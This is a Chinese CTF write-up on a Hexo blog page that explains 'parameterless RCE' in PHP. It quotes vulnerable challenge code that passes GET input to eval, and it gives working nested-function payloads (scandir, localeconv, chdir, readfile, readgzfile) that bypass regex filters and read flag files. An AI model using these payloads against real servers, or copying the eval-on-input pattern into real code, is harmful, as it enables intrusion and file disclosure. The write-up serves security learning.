@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="liduoan.efls">
+    
+    <title>
+        
+            无参数RCE |
+        
+        liduoan修炼笔记
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg","favicon":"https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg","avatar":"https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg","font_size":null,"font_family":"STSong","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"世之奇伟、瑰怪，非常之观，常在于险远 || 而人之所罕至焉，故非有志者不能至也","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               liduoan修炼笔记
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">无参数RCE</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="https://i.postimg.cc/MpmSbVgT/4-U-3-AU-6-0-R8-L6-K5658-H.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">liduoan.efls</span>
+                            
+                                <span class="author-label">Lv4</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2020-04-03 21:20:59</span>
+        <span class="mobile">2020-04-03 21:20</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2020-04-13 01:00:21</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%89%E5%85%A8/">安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.1k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>12 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>单独开一篇的原因是 我被这道题折磨了。。</p>
+<p>首先 我看不懂正则表达式 然后我去找资料学习</p>
+<p>学习正则时的网站</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.jb51.net/tools/zhengze.html" >https://www.jb51.net/tools/zhengze.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>学好了看明白了这道题目的过滤条件</p>
+<p>然后我傻了。这我怎么操作？？</p>
+<p>看了师傅的WP。 emm， 很好 无参RCE。</p>
+<p>所以 这篇博文出来了。</p>
+<p>好多师傅的博客写的很详细</p>
+<span id="more"></span>
+
+<p>附下几个师傅的链接：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" >https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/530.html" >https://www.gem-love.com/ctf/530.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/cioi/p/12329362.html" >https://www.cnblogs.com/cioi/p/12329362.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>这篇来自：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12311239.html" >https://www.cnblogs.com/wangtanzhi/p/12311239.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>这几天做了几道无参数RCE的题目，这里来总结一下，以后忘了也方便再捡起来。<br>首先先来解释一下什么是无参数RCE：</p>
+<p>形式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; eval($_GET[&#x27;code&#x27;]);&#125;</span><br><span class="line">preg_replace(&#x27;/[a-z]+\((?R)?\)/&#x27;, NULL, $code)</span><br><span class="line">pre_match(&#x27;/et|na|nt|strlen|info|path||rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code))</span><br></pre></td></tr></table></figure>
+
+<p>分析一下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_replace 的主要功能就是限制我们传输进来的必须是纯小写字母的函数，而且不能携带参数。</span><br><span class="line">再来看一下：(?R)?，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）</span><br><span class="line"></span><br><span class="line">preg_match的主要功能就是过滤函数，把一些常用不带参数的函数关键部分都给过滤了，需要去构造别的方法去执行命令。</span><br></pre></td></tr></table></figure>
+
+<p>因此，我们可以用这样一句话来解释无参数RCE：<br><strong>我们要使用不传入参数的函数来进行RCE</strong><br>比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(&#x27;a()&#x27;));可以使用</span><br><span class="line">print_r(scandir(&#x27;123&#x27;));不可以使用</span><br></pre></td></tr></table></figure>
+
+<p>再形象一点，就是套娃嘛。。一层套一个函数来达到我们RCE的目的<br>比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>
+
+<p>*<strong>0*</strong>|***1***<strong>0x01 从代码开始分析</strong></p>
+<p>我们先来看一下几天前刚做的一道题目：</p>
+<p><strong>[GXYCTF2019]禁止套娃</strong><br>源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们先来分析一下源码吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1：需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。</span><br><span class="line">2：preg_match过滤了我们伪协议的可能</span><br><span class="line">3：preg_replace 的主要功能就是限制我们传输进来的必须时纯小写字母的函数，而且不能携带参数。只能匹配通过无参数的函数。</span><br><span class="line">4：最后一个preg_match正则匹配掉了et/na/info等关键字，很多函数都用不了</span><br><span class="line">5：eval($_GET[&#x27;exp&#x27;]); 典型的无参数RCE</span><br></pre></td></tr></table></figure>
+
+<p>既然getshell基本不可能，那么考虑读源码看源码，flag应该就在flag.php我们想办法读取<br>首先需要得到当前目录下的文件scandir()函数可以扫描当前目录下的文件，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php print_r(scandir(&#x27;.&#x27;)); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那么问题就是如何构造scandir(‘.’)</p>
+<p>这里再看函数<br>localeconv() 函数：<br>返回一包含本地数字及货币格式信息的数组。而数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值。</p>
+<p>这里还有一个知识点：</p>
+<p>current(localeconv())永远都是个点<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122739121-1009671401.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122739121-1009671401.png"
+                      alt="img"
+                ></a></p>
+<p>那么我们第一步就解决了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>
+
+<p>pos() 是current() 的别名。<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122746590-465028958.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122746590-465028958.png"
+                      alt="img"
+                ></a></p>
+<p>现在的问题就是怎么读取倒数第二个数组呢？</p>
+<p>看手册：<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122752930-1717233019.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122752930-1717233019.png"
+                      alt="img"
+                ></a></p>
+<p>很明显，我们不能直接得到倒数第二组中的内容：</p>
+<h4 id="三种方法："><a href="#三种方法：" class="headerlink" title="三种方法："></a>三种方法：</h4><p><strong>1.array_reverse()</strong></p>
+<p>以相反的元素顺序返回数组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.array_rand(array_flip())</strong></p>
+<p>array_flip()交换数组的键和值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(array_flip(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>
+
+<p>array_rand()从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>3.session_id(session_start())</p>
+<p>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。</p>
+<p>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。</p>
+<p>session_id()可以获取到当前的session id。</p>
+<p>因此我们手动设置名为PHPSESSID的cookie，并设置值为flag.php<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122804933-987719298.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122804933-987719298.png"
+                      alt="img"
+                ></a></p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122811714-1376880862.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122811714-1376880862.png"
+                      alt="img"
+                ></a></p>
+<p>那么我们最后一个问题：如何读flag.php的源码</p>
+<p>因为et被ban了，所以不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://x.x.x.x:x/?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));</span><br><span class="line">?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>
+
+<h3 id="我们再来看一个题目："><a href="#我们再来看一个题目：" class="headerlink" title="我们再来看一个题目："></a>我们再来看一个题目：</h3><p><strong>ByteCTF Boringcode</strong><br>来看代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> $code = file_get_contents($url);</span><br><span class="line">            if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\((?R)?\)/&#x27;, NULL, $code)) &#123;</span><br><span class="line">                if (preg_match(&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123;</span><br><span class="line">                    echo &#x27;bye~&#x27;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;error: host not allowed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;error: invalid url&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们简单分析一下：<br>preg_match中<br>因为只允许使用纯字母函数，print_r这里被禁止掉了<br>注意这里的过滤比上面的多了很多，比如current就不能用了，我们可以用pos代替<br>看wp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
+
+<p>我们一层一层的来分析：<br>首先题目给了提示，flag在上一级目录<br>所以我们要切换到上一级并读取 flag</p>
+<p><strong>1：localeconv()函数</strong><br>前面已经提过：<br>localeconv() 函数：<br>返回一包含本地数字及货币格式信息的数组。而数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值。</p>
+<p>这里还有一个知识点：</p>
+<p>current(localeconv())永远都是个点<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122827442-210069345.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122827442-210069345.png"
+                      alt="img"
+                ></a></p>
+<p><strong>2：pos()函数</strong><br>前面提过：</p>
+<p>作用： 返回数组中的当前元素的值<br>因为正则条件中有nt，所以current()函数就无法使用，但是它有一个别名，就是pos()<br><strong>3： scandir()函数</strong><br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122835861-618102055.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122835861-618102055.png"
+                      alt="img"
+                ></a></p>
+<p>前面 pos() 函数输出的值为点（.），所以这里变成scandir(.)，也就是当前目录</p>
+<p>介绍下一个函数前我们先来了解一下php的数组指向函数，上一个题目简单提了一下<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122844620-1875817965.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122844620-1875817965.png"
+                      alt="img"
+                ></a></p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122851421-1984784318.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122851421-1984784318.png"
+                      alt="img"
+                ></a></p>
+<p><strong>4： next()函数</strong></p>
+<p>作用： 将数组中的内部指针向前移动一位</p>
+<p>在刚才 scandir() 函数返回的数组中，第一位是点（.），此时指针默认指向该位（也就是第一位），通过next()函数，将指针移动到下一位，也就是点点（..）</p>
+<p><strong>5：chdir()函数</strong><br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122859686-1136399217.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122859686-1136399217.png"
+                      alt="img"
+                ></a></p>
+<p>next() 函数返回点点（..），chdir()函数执行 chdir(..) 也就把目录切换到了上一级<br><strong>6：time()函数</strong><br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122908020-1460845853.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122908020-1460845853.png"
+                      alt="img"
+                ></a></p>
+<p>chdir() 函数返回的是 bool 类型的 true ，所以对不需要传入参数的time()函数来说，本来就没有影响，可以正常执行<br><strong>7：localtime()函数</strong><br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122916303-376857048.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122916303-376857048.png"
+                      alt="img"
+                ></a></p>
+<p>localtime()函数可以接受参数，并且第一个参数可以直接接受time()，所以直接利用<br><strong>8：pos()函数</strong></p>
+<p>获取第一个参数，也就是系统当前的秒数<br><strong>9：chr()函数</strong><br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122924673-2074351383.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122924673-2074351383.png"
+                      alt="img"
+                ></a></p>
+<p>chr()函数在这里什么作用呢？因为当秒数为46时，chr(46)&#x3D;”.”，用来获取点（.）（这里不能再用 localeconv() 函数是因为它不能传入参数）<br><strong>10：scandir()函数</strong></p>
+<p>继续扫描当前目录（默认目录得上一级，因为我们刚才已经 chdir(“..”) 切换过）<br><strong>11：end()函数</strong></p>
+<p>作用： 将 array 的内部指针移动到最后一个单元并返回其值<br>scandir() 返回当前目录的数组，end()函数将指针移动到最后一个（这里就是 flag.php ，因为文件名按字母先后排序，而字母 f 在本题中排最后<br><strong>12：readfile()函数</strong></p>
+<p>作用： 读取文件并写入到输出缓冲<br>这里将执行readfile(“flag.php”)，将 flag.php 的内容读取出来<br><strong>13：echo()函数</strong></p>
+<p>用echo()函数将 flag 输出</p>
+<p>本地测试了一下确实能打通<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180456291-543648465.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180456291-543648465.png"
+                      alt="img"
+                ></a></p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180505959-1615152192.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180505959-1615152192.png"
+                      alt="img"
+                ></a></p>
+<p><strong>再来看一道题目：</strong></p>
+<h3 id="2019上海市大学生网络安全大赛-decade"><a href="#2019上海市大学生网络安全大赛-decade" class="headerlink" title="2019上海市大学生网络安全大赛_decade"></a>2019上海市大学生网络安全大赛_decade</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code = $_GET[&#x27;code&#x27;];</span><br><span class="line">if (!empty($code)) &#123;</span><br><span class="line">        if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\((?R)?\)/&#x27;, NULL, $code)) &#123;</span><br><span class="line">            if (preg_match(&#x27;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123;</span><br><span class="line">                    echo &#x27;bye~&#x27;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;No way!!!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">        echo &quot;No way!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>审计源码，过滤的比上一个更多：<br>我们来对比一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
+
+<p>先列一下不能用的函数，看看能不能代替：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">localeconv()</span><br><span class="line">time()</span><br><span class="line">localtime()</span><br><span class="line">readfile()</span><br></pre></td></tr></table></figure>
+
+<p>我们从payload开始分析吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readgzfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));</span><br></pre></td></tr></table></figure>
+
+<p>这里只分析一下我们这个题目和上一个不同，详细的盯着手册在本地测试就行了<br>仔细想想，我们只有两个问题：<br>1：怎么构造点(.)<br>2:readfile被过滤怎么读取</p>
+<p>解决第一个：<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180519215-1970538942.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180519215-1970538942.png"
+                      alt="img"
+                ></a></p>
+<p>46经过chr()转换就是.</p>
+<p>第二个：<br>readgzfile可以代替readfile<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180527480-467818924.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180527480-467818924.png"
+                      alt="img"
+                ></a></p>
+<p>好了问题解决，剩下的就是照着上一个思路搬砖了。</p>
+<p>*<strong>0*</strong>|***1***<strong>0x02 总结</strong></p>
